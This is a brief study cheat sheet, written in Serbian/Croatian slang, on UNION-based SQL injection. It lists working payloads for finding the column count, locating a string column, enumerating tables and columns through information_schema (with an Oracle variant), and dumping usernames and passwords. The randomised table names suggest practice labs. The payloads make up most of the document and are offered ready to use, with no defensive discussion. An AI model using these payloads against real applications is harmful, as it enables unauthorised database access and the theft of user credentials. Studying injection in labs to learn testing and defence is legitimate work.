# SQL injection

## UNION SELECT napad

### Skontaš broj kolona
```sql
' ORDER+BY+3--
```
ili
```sql
'+UNION+SELECT+NULL,NULL--
```
(kod Oracle MORA 'SELECT .. FROM DUAL')
dok ne potrefiš broj kolona...

### Skontaš koja kolona je string (obično)

```sql
' UNION SELECT NULL,NULL,'a',NULL--
```

dok ne potrefiš koja kolona paše.. :)

### UNION SELECT
```sql
' UNION SELECT username, password FROM users--
```

### Browsing the db schema

'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--
--> users_lqlezz npr

'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users_lqlezz'--
--> username_jyfedi,password_fxqtrq

' UNION SELECT username_jyfedi,password_fxqtrq FROM users_lqlezz--

ORACLE:
all_tables i all_tab_columns


